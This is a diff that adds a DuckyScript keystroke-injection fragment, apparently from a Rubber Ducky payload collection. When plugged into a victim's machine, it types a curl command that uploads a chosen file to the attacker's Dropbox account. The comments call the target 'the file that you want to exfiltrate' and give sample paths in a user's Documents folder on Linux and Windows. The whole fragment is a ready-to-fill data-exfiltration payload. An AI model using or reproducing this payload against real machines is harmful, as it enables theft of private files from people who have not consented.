@@ -1,0 +1,24 @@
+
+REM Send to Dropbox function
+STRING curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer 
+
+REM REPLACE #ACCESS_TOKEN with your personal Dropbox Access Token
+STRING #ACCESS_TOKEN
+
+STRING " --header "Dropbox-API-Arg: {\"path\": \"
+
+REM REPLACE #DROPBOX_FOLDER with the Dropbox destination directory name, for istance /$ZIP_NAME
+STRING #DROPBOX_FOLDER
+
+STRING \",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@
+
+REM REPLACE #FILE_TO_EXFILTRATE with the full path of the file that you want to exfiltrate, for istance it can be an archive and in this case should be something like this:
+REM        GNU/Linux:
+REM        |->     /home/aleff/Documents/archive.zip
+REM        Windows:
+REM        |->     C:/Users/aleff/Documents/archive.zip
+STRING #FILE_TO_EXFILTRATE
+
+STRING "
+ENTER
+
